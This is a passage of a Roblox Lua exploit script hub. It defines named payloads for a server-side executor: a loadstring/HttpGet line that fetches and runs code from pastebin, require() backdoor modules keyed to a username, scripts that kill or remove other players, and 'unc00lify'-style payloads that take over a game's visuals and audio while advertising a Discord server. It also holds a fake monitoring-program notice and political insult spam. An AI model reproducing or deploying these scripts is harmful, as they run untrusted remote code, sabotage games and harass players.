bubl("I'm in my prime, and this ain't even final form")

t(3.2)

bubl("They knocked me down, but still, my feet, they find the floor")

t(3.2)

bubl("I went from living rooms straight out to sold-out tours")

t(3.5)

bubl("Life's a fight, but trust, I'm ready for the war")

t(3.3)

bubl("Woah, oh, oh")

t(3.05)

bubl("This is how the story goes")

t(3.6)

bubl("Woah, oh, oh")

t(2.9)

bubl("I guess this is how the story goes")

t(3.3)

bubl("I'm in the thick of it, everybody knows")

t(3)

bubl("They know me where it snows, I skied in and they froze")

t(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

t(3)

bubl("Forty somethin' milli' subs or so, I've been told")

t(3.3)

bubl("From the screen to the ring, to the pеn, to the king")

t(3)

bubl("Where's my crown? That's my bling, always drama when I ring")

t(4.1)

bubl("See, I believe that if I see it in my heart")

t(3)

bubl("Smash through the ceiling 'cause I'm reaching for the stars")

t(3.7)

bubl("Woah, oh, oh")

t(3.05)

bubl("This is how the story goes")

t(3.6)

bubl("Woah, oh, oh")

t(2.9)

bubl("I guess this is how the story goes")

t(3.3)

bubl("I'm in the thick of it, everybody knows")

t(3)

bubl("They know me where it snows, I skied in and they froze")

t(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

t(3)

bubl("Forty somethin' milli' subs or so, I've been told")

t(3.6)

bubl("Highway to heaven, I'm just cruisin' by my lone'")

t(3.2)

bubl("They cast me out, left me for dead, them people cold")

t(3.2)

bubl("My faith in God, mind in the sun, I'm 'bout to sow (Yeah)")

t(3.5)

bubl("My life is hard, I took the wheel, I cracked the code (Yeah-yeah, woah-oh-oh)")

t(6)

bubl("Ain't nobody gon' save you, man, this life will break you (Yeah, woah-oh-oh)")

t(5.8)

bubl("In the thick of it, this is how the story goes")

t(4.5)

bubl("I'm in the thick of it, everybody knows")

t(3)

bubl("They know me where it snows, I skied in and they froze")

t(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

t(3)

bubl("Forty somethin' milli' subs or so, I've been told")

t(3.6)

bubl("I'm in the thick of it, everybody knows")

t(3)

bubl("They know me where it snows, I skied in and they froze")

t(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

t(3)

bubl("Forty somethin' milli' subs or so, I've been told")

t(3.5)

bubl("Wоah, оh, оh")

t(3.05)

bubl("This is hоw the stоry goes")

t(3.6)

bubl("Woah, oh, oh")

t(2.9)

bubl("I guess this is how the story goes")
]], "CS / SS")

cscript("soul serverside", [[
	loadstring(game:HttpGet("https://pastebin.com/raw/adceDwMv"))()
]], "LS")

cscript("ro-xploit reborn", [[
	require(96184029574075)("%replace%with%username%")
]], "RQ")

cscript("killbrick rain", [[
local SpawnRate = 0.5
local BatchSize = 10
local FallSpeed = 50
local SizeVariation = 10

local ShapeTypes = {
	{Class = "Part", Shape = Enum.PartType.Block},
	{Class = "Part", Shape = Enum.PartType.Cylinder},
	{Class = "Part", Shape = Enum.PartType.Ball},
	{Class = "Part", Shape = Enum.PartType.Wedge},
	{Class = "Part", Shape = Enum.PartType.CornerWedge}
}

local ShapeContainer = Instance.new("Folder")
ShapeContainer.Name = "DeadlyRain"
ShapeContainer.Parent = workspace

local LocalPlayer = game:GetService("Players").LocalPlayer

local function createShapeBatch()
	for i = 1, BatchSize do
		local shapeData = ShapeTypes[math.random(1, #ShapeTypes)]

		local part = Instance.new(shapeData.Class)
		part.Shape = shapeData.Shape
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromHex("4051ED")

		local baseSize = math.random(5, SizeVariation)
		part.Size = Vector3.new(baseSize, baseSize, baseSize)

		local camera = workspace.CurrentCamera
		local spawnX = math.random(-200, 200)
		local spawnZ = math.random(-200, 200)
		local spawnPos = Vector3.new(
			camera.CFrame.Position.X + spawnX,
			camera.CFrame.Position.Y + 100,
			camera.CFrame.Position.Z + spawnZ
		)

		part.Position = spawnPos
		part.Anchored = false
		part.CanCollide = true
		part.CanTouch = true
		part.CanQuery = true

		part.Orientation = Vector3.new(
			math.random(0, 360),
			math.random(0, 360),
			math.random(0, 360)
		)

		local bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.Velocity = Vector3.new(
			math.random(-20, 20),
			-FallSpeed - math.random(0, 30),
			math.random(-20, 20)
		)
		bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
		bodyVelocity.Parent = part

		part.Touched:Connect(function(hit)
			local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
			local player = game:GetService("Players"):GetPlayerFromCharacter(hit.Parent)

			if humanoid and player and player ~= LocalPlayer then
				humanoid.Health = 0
			end
		end)

		part.Parent = ShapeContainer
	end
end

local function rainShapes()
	while true do
		createShapeBatch()
		t(SpawnRate)
	end
end

rainShapes()
]], "CS / SS")

cscript("KJ", [[
require(89529616632600)("%replace%with%username%", "KJ")
]], "RQ")

cscript("saitama", [[
require(14499140823)("%replace%with%username%", "saitama2")
]], "RQ")

cscript("assign to team", [[
local Teams = game:GetService("Teams")
local localPlayer = game.Players:FindFirstChild("%replace%with%username%")

local TEAM_NAME = "unable"
local TEAM_COLOR = Color3.fromHex("000000")

local function createTeam()
	for _, team in ipairs(Teams:GetTeams()) do
		if team.Name == TEAM_NAME then
			return team
		end
	end

	local newTeam = Instance.new("Team")
	newTeam.Name = TEAM_NAME
	newTeam.TeamColor = BrickColor.new(TEAM_COLOR)
	newTeam.Parent = Teams

	return newTeam
end

local function assignToTeam(team)
	localPlayer.Team = team
end

local team = createTeam()
assignToTeam(team)
]], "CS / SS")

cscript("discord notifications", [[
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() t(math.random(1, 3)) end
]], "CS / SS")

cscript("server lock", [[
while true do
for a, xb in pairs(game.Players:children()) do
if xb.Name~=game.Players.LocalPlayer.Name then xb:Destroy() end
end
t(.69)
end
]], "CS / SS")

cscript("bloxiphant message", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubl("Your behavior is briefly being monitored under the Monitoring Program. To opt-out please contact Gerard B. (Bloxiphant) via e-mail or Roblox messages.")
end)
]], "CS / SS")

cscript("flood map", [[
local flood = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250, 500, 1250))
flood = flood:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(flood, 4, Enum.Material.Water)
]], "CS / SS")

cscript("HD admin", [[
	require(9985547712):give("%replace%with%username%")
]], "RQ")

cscript("taco rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=14846869";
	v764.TextureId = "http://www.roblox.com/asset/?id=14846834";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("duck rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=9419831";
	v764.TextureId = "http://www.roblox.com/asset/?id=9419827";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("unc00lify", [[
local batchSize = 1000000
local imageId = "rbxassetid://92724155258384"
local musicId = "rbxassetid://110251728423993"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		t(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        t(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			t(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            t(1)
        end

        t(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			t(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		t(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				t(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
			end
			t(1)
		end
	end)

	write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound" then
				sound:Destroy()
			end
		end
		t(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		t(2)
	end
end)
]], "CS / SS")

cscript("unableify", [[
local batchSize = 1000000
local imageId = "rbxassetid://82967466186087"
local musicId = "rbxassetid://85833437298815"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		t(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        t(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			t(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            t(1)
        end

        t(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			t(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound2")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound2"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 17.5
			sound.PlaybackSpeed = 1.4
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		t(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				t(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
			end
			t(1)
		end
	end)

	write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound2" then
				sound:Destroy()
			end
		end
		t(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		t(2)
	end
end)
]], "CS / SS")

cscript("shedletsky", [[
local batchSize = 1000000
local imageId = "rbxassetid://85312612489831"
local musicId = "rbxassetid://101389433601746"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		t(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        t(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			t(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            t(1)
        end

        t(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound3")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound3"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		t(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound3" then
				sound:Destroy()
			end
		end
		t(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		t(2)
	end
end)
]], "CS / SS")

cscript("chinaify", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubl("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳")
end)

local batchSize = 1000000
local imageId = "rbxassetid://13464805869"
local musicId = "rbxassetid://134713831368801"

local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = "rbxassetid://15886770889"
		sky.SkyboxDn = "rbxassetid://15886770889"
		sky.SkyboxFt = "rbxassetid://15886770889"
		sky.SkyboxLf = "rbxassetid://15886770889"
		sky.SkyboxRt = "rbxassetid://15886770889"
		sky.SkyboxUp = "rbxassetid://15886770889"
		sky.Parent = Lighting

		t(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
